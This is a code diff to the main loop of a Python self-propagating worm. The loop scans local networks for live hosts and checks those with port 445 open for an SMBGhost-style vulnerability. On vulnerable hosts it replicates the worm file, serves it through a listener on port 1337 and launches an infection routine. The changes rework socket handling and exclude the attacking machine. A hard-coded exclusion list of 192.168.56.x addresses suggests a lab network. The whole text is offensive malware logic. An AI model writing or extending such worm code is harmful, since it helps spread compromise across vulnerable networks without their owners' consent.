@@ -1,4 +1,4 @@
-import sys, os, platform, time
+import sys, os, platform, time, socket
 import armory.SMBGhost.cve20220796scanner as cve20220796scanner
 from sniff import sniff
 from infect import infect
@@ -25,6 +25,10 @@ def main():
     not_testing_targets = ["192.168.56.1", "192.168.56.100", "192.168.56.108"]
     network = sniff()
     for local_ip in network.get_host_networks().keys():
+        listening_port = 1337
+        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        sock.bind((local_ip,listening_port))
+        sock.listen(5)
         for target_ip in network.get_alive_hosts(local_ip):
             target_port_details = network.get_host_port_details(target_ip)
             print("Scanning Host:{} for port service".format(target_ip.address))
@@ -32,15 +36,14 @@ def main():
                 for running_port in target_port_details[target_ip.address]["ports"]:
                     port = running_port["portid"]
                     print("Host: {} - running port:{}".format(target_ip.address, port))
-                    if not target_ip.address in not_testing_targets:
+                    if (not target_ip.address in not_testing_targets) and (not local_ip == target_ip.address):
                         attack = (cve20220796scanner.is_vulnerable(target_ip.address) and port == "445")
                         if attack:
                             print("start to attack")
                             #local_ip = "0.0.0.0"
                             print("attacking port{}".format(running_port))
-                            listening_port = 1337
                             worm = replicate(file_path)
-                            tunnel = comm.tunnel(worm,local_ip, listening_port)
+                            tunnel = comm.tunnel(worm,sock,local_ip, listening_port)
                             tunnel.start()
                             
                             time.sleep(2)
@@ -48,11 +51,10 @@ def main():
                             infection.start()
                             
                             infection.join()
-                            while not tunnel.get_done():
-                                time.sleep(2)
-                            tunnel.close_connection(target_ip.address)
+                            time.sleep(2)
+                            #tunnel.close_connection(target_ip.address)
                             tunnel.join()
-                            
+        sock.close()    
                             
 
 def clone(file_path, filename):
